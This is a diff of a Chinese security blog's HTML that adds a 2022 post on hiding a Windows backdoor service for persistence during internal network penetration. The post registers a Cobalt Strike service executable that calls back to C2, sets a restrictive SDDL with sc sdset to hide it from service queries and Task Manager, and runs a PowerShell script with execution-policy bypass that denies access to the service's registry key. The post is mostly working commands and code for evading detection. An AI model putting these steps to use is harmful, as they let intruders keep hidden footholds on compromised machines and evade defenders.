@@ -24,7 +24,7 @@
 
   
 
-  <title>about | 9z1nc</title>
+  <title>安全描述符隐藏后门服务 | 9z1nc</title>
 
   
 
@@ -47,7 +47,7 @@
   <div class="root-container">
     
 <!-- header container -->
-<header class="header-container">
+<header class="header-container post">
   
     <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
   
@@ -97,36 +97,147 @@
 
   
   
-
-  
-  
     <div class="header-content">
-      <div class="post-text layout-block layout-padding">
-        <h1 class="title-wrap">about</h1>
-        
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">安全描述符隐藏后门服务</h1>
+          <h2 class="title-sub-wrap">
+            <strong>9z1nc</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2022-09-08T13:12:00.000Z" itemprop="datePublished">2022-09-08</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
       </div>
     </div>
+  
+
+  
   
   
 </header>
 
-    <!-- 分页(其他自定义页面) -->
+    <!-- 文章 -->
 
-<!-- 自定义页面 -->
-
+<!-- 文章内容 -->
 <div class="body-container">
   <article class="content-container layout-block post-container">
     <div class="article-info">
       
+      
+      
+      
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        
+        <h1 id="利用安全描述符隐藏后门服务"><a href="#利用安全描述符隐藏后门服务" class="headerlink" title="利用安全描述符隐藏后门服务"></a>利用安全描述符隐藏后门服务</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​	在内网渗透的时候为了防止目标关机重启等问题导致权限丢失，会采用将后门程序注册为自启动的服务(windows的服务会在开机时自动启动)，让木马跟随服务的启动来回连我们的C2服务器，而在将木马注册为服务时，特别容易被发现。</p>
+<p>现在我们通过安全描述符(SSDL)来隐藏服务。</p>
+<h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><p>这里用cs生成Windows service exe</p>
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/2042d3b6a5dc45d08022cee226f60371.png" class="" title="2042d3b6a5dc45d08022cee226f60371">
+
+
+
+<p>使用sc命令 注册服务</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create test binPath= C:\Users\PunchMan\Desktop\testone.exe <span class="built_in">start</span>= auto <span class="built_in">type</span>= own displayname= test</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/9c543c1969bd4986b2972e35b4cb5ee4.png" class="" title="9c543c1969bd4986b2972e35b4cb5ee4">
+
+
+
+<p>启动服务</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc <span class="built_in">start</span> test</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/cf614922799942b1828de1f6c140c1ee.png" class="" title="cf614922799942b1828de1f6c140c1ee">
+
+
+
+<p>使用sc qc test命令可以直接查看到服务文件的路径</p>
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/2f6ceab1fa3746308f726e107a9d4c3b.png" class="" title="2f6ceab1fa3746308f726e107a9d4c3b">
+
+
+
+<p>通过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B3%A8%E5%86%8C%E8%A1%A8&spm=1001.2101.3001.7020">注册表</a>也可以查看到服务相关信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\服务名</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/eea9d76379134a9f8fd378e1d3360818.png" class="" title="eea9d76379134a9f8fd378e1d3360818">
+
+
+
+<p>通过修改SDDL隐藏后门服务</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc sdset &quot;test&quot; &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用sc query test 出现拒绝访问，任务管理器中也看不到了</p>
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/2e2bc7e6a477401989314e75e3ba2b9c.png" class="" title="2e2bc7e6a477401989314e75e3ba2b9c">
+
+
+
+<p>但是通过注册表和sc qc test还是可以看到后门服务</p>
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/ff56075b8d114a5f8303b617202b6057.png" class="" title="ff56075b8d114a5f8303b617202b6057">
+
+
+
+<p>通过脚本修改注册表使其不可见</p>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Server-Sddl-Change</span></span>&#123;</span><br><span class="line">[<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">param</span></span><br><span class="line">    (</span><br><span class="line">        [<span class="type">parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$false</span>)][<span class="built_in">String</span>]<span class="variable">$Name</span></span><br><span class="line">    )</span><br><span class="line"><span class="variable">$ROOT</span> = <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\&quot;</span></span><br><span class="line"><span class="variable">$S</span> = <span class="variable">$ROOT</span>+<span class="variable">$NAME</span></span><br><span class="line"><span class="variable">$acl</span> = <span class="built_in">Get-Acl</span> <span class="variable">$S</span></span><br><span class="line"><span class="variable">$acl</span>.SetAccessRuleProtection(<span class="variable">$true</span>, <span class="variable">$false</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = [<span class="type">System.Security.Principal.NTAccount</span>]<span class="string">&quot;Everyone&quot;</span></span><br><span class="line"><span class="variable">$access</span> = [<span class="type">System.Security.AccessControl.RegistryRights</span>]<span class="string">&quot;QueryValues&quot;</span></span><br><span class="line"><span class="variable">$inheritance</span> = [<span class="type">System.Security.AccessControl.InheritanceFlags</span>]<span class="string">&quot;None&quot;</span></span><br><span class="line"><span class="variable">$propagation</span> = [<span class="type">System.Security.AccessControl.PropagationFlags</span>]<span class="string">&quot;None&quot;</span></span><br><span class="line"><span class="variable">$type</span> = [<span class="type">System.Security.AccessControl.AccessControlType</span>]<span class="string">&quot;Deny&quot;</span></span><br><span class="line"><span class="variable">$rule</span> = <span class="built_in">New-Object</span> System.Security.AccessControl.RegistryAccessRule( `</span><br><span class="line"><span class="variable">$person</span>,<span class="variable">$access</span>,<span class="variable">$inheritance</span>,<span class="variable">$propagation</span>,<span class="variable">$type</span>)</span><br><span class="line"><span class="variable">$acl</span>.AddAccessRule(<span class="variable">$rule</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = [<span class="type">System.Security.Principal.NTAccount</span>]<span class="string">&quot;Everyone&quot;</span></span><br><span class="line"><span class="variable">$access</span> = [<span class="type">System.Security.AccessControl.RegistryRights</span>]<span class="string">&quot;SetValue,CreateSubKey,EnumerateSubKeys,Notify,CreateLink,Delete,ReadPermissions,WriteKey,ExecuteKey,ReadKey,ChangePermissions,TakeOwnership&quot;</span></span><br><span class="line"><span class="variable">$inheritance</span> = [<span class="type">System.Security.AccessControl.InheritanceFlags</span>]<span class="string">&quot;None&quot;</span></span><br><span class="line"><span class="variable">$propagation</span> = [<span class="type">System.Security.AccessControl.PropagationFlags</span>]<span class="string">&quot;None&quot;</span></span><br><span class="line"><span class="variable">$type</span> = [<span class="type">System.Security.AccessControl.AccessControlType</span>]<span class="string">&quot;Allow&quot;</span></span><br><span class="line"><span class="variable">$rule</span> = <span class="built_in">New-Object</span> System.Security.AccessControl.RegistryAccessRule( `</span><br><span class="line"><span class="variable">$person</span>,<span class="variable">$access</span>,<span class="variable">$inheritance</span>,<span class="variable">$propagation</span>,<span class="variable">$type</span>)</span><br><span class="line"><span class="variable">$acl</span>.AddAccessRule(<span class="variable">$rule</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-Acl</span> <span class="variable">$S</span> <span class="variable">$acl</span></span><br><span class="line">&#125;;Server<span class="literal">-Sddl-Change</span> <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行脚本</p>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass C:\Users\PunchMan\Desktop\test.ps</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/80acf9ce4be64595bf558fbc8995aca7.png" class="" title="80acf9ce4be64595bf558fbc8995aca7">
+
+
+
+<p>重启电脑</p>
+<img src="/2022/09/08/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1/f97f275797a4437e93d3a4fa611c7ea4.png" class="" title="f97f275797a4437e93d3a4fa611c7ea4">
+
       </section>
 
       
       
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">云函数隐藏c2服务器</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
 
-      
-      
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
     </div>
     <div class="widget-info">
       <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -163,6 +274,8 @@
     </div>
   </div>
 </section>
+
+      
 
       
 <section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -208,7 +321,6 @@
     </div>
   </article>
 </div>
-
 
     <!-- footer container -->
 <footer id="footer" class="footer">
